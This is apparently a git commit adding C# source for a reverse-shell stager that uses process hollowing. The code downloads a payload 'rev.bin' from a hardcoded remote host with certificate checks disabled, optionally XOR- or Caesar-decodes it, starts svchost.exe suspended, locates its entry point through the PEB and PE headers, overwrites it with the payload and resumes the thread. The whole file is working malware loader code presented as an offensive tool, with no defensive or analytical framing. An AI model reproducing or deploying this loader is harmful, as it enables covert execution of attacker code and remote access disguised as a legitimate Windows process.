c2bbb7f576a55bd9bd904ca7bab3df9255b07a14
lly02 <lly.02@outlook.com>
2026-01-04 03:59:23 -0800

    stager process hollowing

---
+++ reverse_shell/stager/StagerProcessHollowing/Program.cs
@@ -0,0 +1,179 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace StagerProcessHollowing
+{
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+    struct STARTUPINFO
+    {
+        public Int32 cb;
+        public IntPtr lpReserved;
+        public IntPtr lpDesktop;
+        public IntPtr lpTitle;
+        public Int32 dwX;
+        public Int32 dwY;
+        public Int32 dwXSize;
+        public Int32 dwYSize;
+        public Int32 dwXCountChars;
+        public Int32 dwYCountChars;
+        public Int32 dwFillAttribute;
+        public Int32 dwFlags;
+        public Int16 wShowWindow;
+        public Int16 cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct PROCESS_BASIC_INFORMATION
+    {
+        public IntPtr Reserved1;
+        public IntPtr PebAddress;
+        public IntPtr Reserved2;
+        public IntPtr Reserved3;
+        public IntPtr UniquePid;
+        public IntPtr MoreReserved;
+    }
+
+    internal class Program
+    {
+        private static string url = "http://192.168.0.131:81/rev.bin";
+        private static string decryption = "";
+        private static char key = 'k';
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern bool CreateProcess(
+           string lpApplicationName,
+           string lpCommandLine,
+           IntPtr lpProcessAttributes,
+           IntPtr lpThreadAttributes,
+           bool bInheritHandles,
+           uint dwCreationFlags,
+           IntPtr lpEnvironment,
+           string lpCurrentDirectory,
+           [In] ref STARTUPINFO lpStartupInfo,
+           out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
+            int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
+            uint ProcInfoLen, ref uint retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+            [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        public static void DownloadAndExecute()
+        {
+            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+            System.Net.WebClient client = new System.Net.WebClient();
+            byte[] buf = client.DownloadData(url);
+            byte[] shellcode = null;
+
+            switch (decryption)
+            {
+                case "xor":
+                    shellcode = xor(buf, key);
+                    break;
+
+                case "caesar":
+                    shellcode = caesar(buf, key);
+                    break;
+
+                // not encoded
+                default:
+                    shellcode = buf;
+                    break;
+            }
+
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
+                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+            uint tmp = 0;
+            IntPtr hProcess = pi.hProcess;
+            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+
+            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+
+            byte[] addrBuf = new byte[IntPtr.Size];
+            IntPtr nRead = IntPtr.Zero;
+            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+
+            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+            byte[] data = new byte[0x200];
+            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+            uint opthdr = e_lfanew_offset + 0x28;
+            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+
+            ResumeThread(pi.hThread);
+        }
+
+        public static void Main(String[] args)
+        {
+            DownloadAndExecute();
+        }
+
+        private static byte[] xor(byte[] buf, char key)
+        {
+            byte[] encoded = new byte[buf.Length];
+            for (int i = 0; i < buf.Length; i++)
+            {
+                encoded[i] = (byte)(((uint)buf[i] ^ (byte)key));
+            }
+
+            return encoded;
+        }
+
+        private static byte[] caesar(byte[] buf, char key)
+        {
+            byte[] encoded = new byte[buf.Length];
+            for (int i = 0; i < buf.Length; i++)
+            {
+                encoded[i] = (byte)(((uint)buf[i] - (byte)key) & 0xFF);
+            }
+
+            return encoded;
+        }
+    }
+}
